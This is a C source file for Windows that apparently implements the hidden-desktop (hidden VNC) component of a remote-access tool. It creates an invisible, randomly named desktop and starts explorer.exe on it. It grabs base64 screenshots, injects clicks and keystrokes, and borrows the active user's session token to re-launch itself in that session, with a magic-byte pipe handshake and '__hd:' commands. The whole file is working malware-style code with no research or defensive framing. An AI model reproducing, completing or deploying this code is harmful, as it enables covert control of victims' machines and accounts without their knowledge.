#include <windows.h>
#include <wtsapi32.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static HDESK g_hd;
static int g_is_host;
static wchar_t g_name[12];
static wchar_t g_winsta[32];
static HANDLE g_to_child = INVALID_HANDLE_VALUE;
static HANDLE g_from_child = INVALID_HANDLE_VALUE;

static char *dupstr(const char *s) {
    size_t n = strlen(s);
    char *o = (char *)malloc(n + 1);
    if (o) memcpy(o, s, n + 1);
    return o;
}

static char *b64(const unsigned char *data, size_t len) {
    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t out_len = 4 * ((len + 2) / 3);
    char *out = (char *)malloc(out_len + 1);
    size_t i, j = 0;
    if (!out) return NULL;
    for (i = 0; i < len; i += 3) {
        unsigned n = data[i] << 16;
        if (i + 1 < len) n |= data[i + 1] << 8;
        if (i + 2 < len) n |= data[i + 2];
        out[j++] = t[(n >> 18) & 63];
        out[j++] = t[(n >> 12) & 63];
        out[j++] = (i + 1 < len) ? t[(n >> 6) & 63] : '=';
        out[j++] = (i + 2 < len) ? t[n & 63] : '=';
    }
    out[j] = 0;
    return out;
}

static void desk_name(void) {
    unsigned s;
    int i;
    if (g_name[0]) return;
    s = GetCurrentProcessId() ^ GetTickCount();
    g_name[0] = (wchar_t)(L'a' + (s % 26));
    for (i = 1; i < 8; i++) {
        s = s * 1664525u + 1013904223u;
        g_name[i] = L"abcdefghijklmnopqrstuvwxyz0123456789"[s % 36];
    }
    g_name[8] = 0;
    lstrcpyW(g_winsta, L"WinSta0\\");
    lstrcatW(g_winsta, g_name);
}

static int ensure(void) {
    if (g_hd) return 1;
    desk_name();
    g_hd = CreateDesktopW(g_name, NULL, NULL, 0, 0x10000000, NULL);
    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x02000000);
    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x10000000);
    return g_hd != NULL;
}

static char *on_desktop(char *(*fn)(void *), void *arg) {
    if (!ensure()) {
        char buf[64];
        snprintf(buf, sizeof(buf), "desktop open failed %lu", GetLastError());
        return dupstr(buf);
    }
    if (!SetThreadDesktop(g_hd)) return dupstr("set desktop failed");
    return fn(arg);
}

static char *do_start(void *arg) {
    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\explorer.exe";
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t desktop[32];
    desk_name();
    lstrcpyW(desktop, g_winsta);
    wchar_t cmd[1024];
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = desktop;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    MultiByteToWideChar(CP_UTF8, 0, exe, -1, cmd, 1024);
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        return dupstr("spawn failed");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    Sleep(1200);
    char buf[80];
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    snprintf(buf, sizeof(buf), "desktop started pid=%lu session=%lu", pi.dwProcessId, sid);
    return dupstr(buf);
}

static BOOL CALLBACK pick_window(HWND hwnd, LPARAM lp) {
    RECT rc;
    char title[64];
    if (!IsWindowVisible(hwnd)) return TRUE;
    GetWindowRect(hwnd, &rc);
    if (rc.right - rc.left < 200 || rc.bottom - rc.top < 120) return TRUE;
    title[0] = 0;
    GetWindowTextA(hwnd, title, sizeof(title));
    if (title[0]) { *(HWND *)lp = hwnd; return FALSE; }
    if (*(HWND *)lp == NULL) *(HWND *)lp = hwnd;
    return TRUE;
}

static char *do_frame(void *arg) {
    (void)arg;
    HWND hwnd = NULL;
    HDC hdc;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int dw, dh, stride, y;
    HDC mem;
    HBITMAP bmp, old;
    BITMAPINFO bi;
    unsigned char *pixels, *file;
    char *encoded, *out;
    size_t flen;
    EnumWindows(pick_window, (LPARAM)&hwnd);
    if (!hwnd) hwnd = GetDesktopWindow();
    hdc = GetDC(hwnd);
    if (sw <= 0 || sh <= 0) { sw = 1024; sh = 768; }
    dw = sw > 640 ? 640 : sw;
    dh = sh * dw / sw;
    if (dh < 1) dh = 1;
    mem = CreateCompatibleDC(hdc);
    bmp = CreateCompatibleBitmap(hdc, dw, dh);
    old = SelectObject(mem, bmp);
    PrintWindow(hwnd, mem, 0);
    SelectObject(mem, old);
    ZeroMemory(&bi, sizeof(bi));
    bi.bmiHeader.biSize = 40;
    bi.bmiHeader.biWidth = dw;
    bi.bmiHeader.biHeight = dh;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    stride = ((dw * 3 + 3) / 4) * 4;
    pixels = (unsigned char *)calloc(1, stride * dh);
    GetDIBits(mem, bmp, 0, dh, pixels, &bi, DIB_RGB_COLORS);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, hdc);
    flen = 54 + stride * (size_t)dh;
    file = (unsigned char *)calloc(1, flen);
    memcpy(file, "BM", 2);
    *(uint32_t *)(file + 2) = (uint32_t)flen;
    *(uint32_t *)(file + 10) = 54;
    *(uint32_t *)(file + 14) = 40;
    *(int32_t *)(file + 18) = dw;
    *(int32_t *)(file + 22) = dh;
    *(uint16_t *)(file + 26) = 1;
    *(uint16_t *)(file + 28) = 24;
    memcpy(file + 54, pixels, stride * (size_t)dh);
    free(pixels);
    encoded = b64(file, flen);
    free(file);
    out = (char *)malloc(32 + strlen(encoded));
    sprintf(out, "HDIMG:%d,%d:%s", dw, dh, encoded);
    free(encoded);
    (void)y;
    return out;
}

struct frame_job { char *result; HANDLE done; };
static DWORD WINAPI frame_worker(LPVOID p) {
    struct frame_job *j = p;
    j->result = on_desktop(do_frame, NULL);
    SetEvent(j->done);
    return 0;
}

static char *do_click(void *arg) {
    int x = 0, y = 0, right = 0;
    int sw, sh;
    char *s = (char *)arg;
    if (!s || sscanf(s, "%d %d %d", &x, &y, &right) < 2) return dupstr("click needs x y");
    sw = GetSystemMetrics(SM_CXSCREEN); sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0) sw = 1024;
    if (sh <= 0) sh = 768;
    mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, (DWORD)(x * 65535 / sw), (DWORD)(y * 65535 / sh), 0, 0);
    if (right) {
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        return dupstr("rclick");
    }
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    {
        char buf[64];
        snprintf(buf, sizeof(buf), "click %d %d", x, y);
        return dupstr(buf);
    }
}

static char *do_type(void *arg) {
    const char *text = arg ? (const char *)arg : "";
    int n = 0;
    for (; *text; text++, n++) {
        wchar_t w;
        SHORT pair;
        BYTE vk;
        MultiByteToWideChar(CP_UTF8, 0, text, 1, &w, 1);
        if (*text == '\n' || *text == '\r') {
            keybd_event(VK_RETURN, 0, 0, 0);
            keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
            continue;
        }
        pair = VkKeyScanW(w);
        vk = (BYTE)(pair & 0xFF);
        if (vk == 0xFF) continue;
        if (pair & 0x100) keybd_event(VK_SHIFT, 0, 0, 0);
        keybd_event(vk, 0, 0, 0);
        keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
        if (pair & 0x100) keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
    }
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "typed %d", n);
        return dupstr(buf);
    }
}

static char *do_key(void *arg) {
    int vk = arg ? atoi((const char *)arg) : 13;
    if (vk <= 0) vk = 13;
    keybd_event((BYTE)vk, 0, 0, 0);
    keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "key %d", vk);
        return dupstr(buf);
    }
}

static int session_id(void) {
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    return (int)sid;
}

static DWORD pick_session(void) {
    DWORD console = WTSGetActiveConsoleSessionId();
    PWTS_SESSION_INFOA info = NULL;
    DWORD count = 0, i, chosen = 0xFFFFFFFF;
    HANDLE tok = NULL;
    if (console != 0 && console != 0xFFFFFFFF && WTSQueryUserToken(console, &tok)) {
        CloseHandle(tok);
        return console;
    }
    if (!WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &info, &count)) return 0xFFFFFFFF;
    for (i = 0; i < count; i++) {
        if (info[i].SessionId == 0 || info[i].State != WTSActive) continue;
        if (WTSQueryUserToken(info[i].SessionId, &tok)) {
            chosen = info[i].SessionId;
            CloseHandle(tok);
            break;
        }
    }
    WTSFreeMemory(info);
    return chosen;
}

static int write_all(HANDLE h, const void *buf, DWORD n) {
    const char *p = buf;
    while (n) {
        DWORD w = 0;
        if (!WriteFile(h, p, n, &w, NULL) || !w) return 0;
        p += w;
        n -= w;
    }
    return 1;
}

static int read_all(HANDLE h, void *buf, DWORD n) {
    char *p = buf;
    while (n) {
        DWORD r = 0;
        if (!ReadFile(h, p, n, &r, NULL) || !r) return 0;
        p += r;
        n -= r;
    }
    return 1;
}

static int read_timeout(HANDLE h, void *buf, DWORD n, int ms) {
    char *p = buf;
    int waited = 0;
    while (n) {
        DWORD avail = 0, r = 0;
        if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL)) return 0;
        if (!avail) {
            if (waited >= ms) return 0;
            Sleep(50);
            waited += 50;
            continue;
        }
        if (avail > n) avail = n;
        if (!ReadFile(h, p, avail, &r, NULL) || !r) return 0;
        p += r;
        n -= r;
    }
    return 1;
}

static int launch_host(void) {
    DWORD sid = pick_session();
    HANDLE tok = NULL, dup = NULL;
    HANDLE cr = NULL, cw = NULL, rr = NULL, rw = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char exe[1024], cmd[1100];
    unsigned char mag[4] = {0xA7, 0x3C, 0x91, 0x5E};
    DWORD wrote = 0;
    if (sid == 0xFFFFFFFF || !WTSQueryUserToken(sid, &tok)) return 0;
    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup)) {
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&cr, &cw, &sa, 0) || !CreatePipe(&rr, &rw, &sa, 0)) {
        CloseHandle(dup);
        return 0;
    }
    SetHandleInformation(cw, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rr, HANDLE_FLAG_INHERIT, 0);
    WriteFile(cw, mag, 4, &wrote, NULL);
    GetModuleFileNameA(NULL, exe, MAX_PATH);
    snprintf(cmd, sizeof(cmd), "\"%s\"", exe);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = cr;
    si.hStdOutput = rw;
    si.hStdError = rw;
    if (!CreateProcessAsUserA(dup, NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(dup);
            CloseHandle(cr); CloseHandle(cw); CloseHandle(rr); CloseHandle(rw);
            return 0;
        }
    }
    CloseHandle(dup);
    CloseHandle(cr);
    CloseHandle(rw);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    g_to_child = cw;
    g_from_child = rr;
    return 1;
}

static char *via_host(const char *cmd) {
    DWORD n = (DWORD)strlen(cmd);
    char *out = NULL;
    if (g_to_child == INVALID_HANDLE_VALUE || g_from_child == INVALID_HANDLE_VALUE) {
        if (!launch_host()) {
            char buf[64];
            snprintf(buf, sizeof(buf), "desktop host failed %lu", GetLastError());
            return dupstr(buf);
        }
    }
    if (write_all(g_to_child, &n, 4) && write_all(g_to_child, cmd, n) && read_timeout(g_from_child, &n, 4, 4000) && n < 8 * 1024 * 1024) {
        out = (char *)malloc(n + 1);
        if (out && read_timeout(g_from_child, out, n, 4000)) out[n] = 0;
        else { free(out); out = NULL; }
    }
    if (!out) {
        CloseHandle(g_to_child);
        CloseHandle(g_from_child);
        g_to_child = g_from_child = INVALID_HANDLE_VALUE;
        return dupstr("desktop host io failed");
    }
    return out;
}

char *hidden_desktop(const char *cmd);

int hd_take_host(void) {
    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
    unsigned char mag[4], expect[4] = {0xA7, 0x3C, 0x91, 0x5E};
    DWORD got = 0;
    if (!in || in == INVALID_HANDLE_VALUE || GetFileType(in) != FILE_TYPE_PIPE) return 0;
    if (!PeekNamedPipe(in, mag, 4, &got, NULL, NULL) || got < 4 || memcmp(mag, expect, 4) != 0) return 0;
    ReadFile(in, mag, 4, &got, NULL);
    return 1;
}

int hd_host_main(void) {
    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    g_is_host = 1;
    if (!ensure()) return 1;
    on_desktop(do_start, "C:\\Windows\\explorer.exe");
    for (;;) {
        DWORD n = 0;
        char *cmd, *resp;
        if (!read_all(in, &n, 4) || n > 4096) return 0;
        cmd = (char *)malloc(n + 1);
        if (!cmd || !read_all(in, cmd, n)) return 0;
        cmd[n] = 0;
        resp = hidden_desktop(cmd);
        free(cmd);
        n = (DWORD)strlen(resp);
        write_all(out, &n, 4);
        write_all(out, resp, n);
        free(resp);
    }
}

char *hidden_desktop(const char *cmd) {
    const char *rest, *sp, *action, *arg;
    char act[32];
    if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
    if (!g_is_host) return via_host(cmd);
    rest = cmd + 5;
    while (*rest == ' ') rest++;
    sp = strchr(rest, ' ');
    if (!sp) { action = rest; arg = ""; }
    else {
        size_t n = (size_t)(sp - rest);
        if (n > 31) n = 31;
        memcpy(act, rest, n);
        act[n] = 0;
        action = act;
        arg = sp + 1;
    }
    if (action[0] == 0 || strcmp(action, "start") == 0) return on_desktop(do_start, (void *)arg);
    if (strcmp(action, "frame") == 0) {
        struct frame_job j;
        HANDLE th;
        j.done = CreateEventA(NULL, TRUE, FALSE, NULL);
        j.result = NULL;
        th = CreateThread(NULL, 0, frame_worker, &j, 0, NULL);
        if (!th || WaitForSingleObject(j.done, 2500) != WAIT_OBJECT_0) {
            if (th) CloseHandle(th);
            CloseHandle(j.done);
            return dupstr("frame timed out");
        }
        CloseHandle(th);
        CloseHandle(j.done);
        return j.result ? j.result : dupstr("frame failed");
    }
    if (strcmp(action, "click") == 0) return on_desktop(do_click, (void *)arg);
    if (strcmp(action, "rclick") == 0) {
        char buf[128];
        snprintf(buf, sizeof(buf), "%s 1", arg);
        return on_desktop(do_click, buf);
    }
    if (strcmp(action, "type") == 0) return on_desktop(do_type, (void *)arg);
    if (strcmp(action, "key") == 0) return on_desktop(do_key, (void *)arg);
    if (strcmp(action, "stop") == 0) {
        if (g_hd) { CloseDesktop(g_hd); g_hd = NULL; }
        return dupstr("desktop stopped");
    }
    return dupstr("unknown desktop action");
}
